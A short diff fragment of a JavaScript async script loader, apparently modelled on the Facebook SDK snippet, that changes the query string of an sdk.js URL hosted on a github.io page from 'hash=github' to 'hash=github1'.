@@ -78,7 +78,7 @@
   h = document.getElementsByTagName("script")[0];
   h.parentNode && h.parentNode.insertBefore(k, h);
 })(
-  "https://ankera.github.io//en_US/sdk.js?hash=github",
+  "https://ankera.github.io//en_US/sdk.js?hash=github1",
   1699239472,
   "FB",
   [
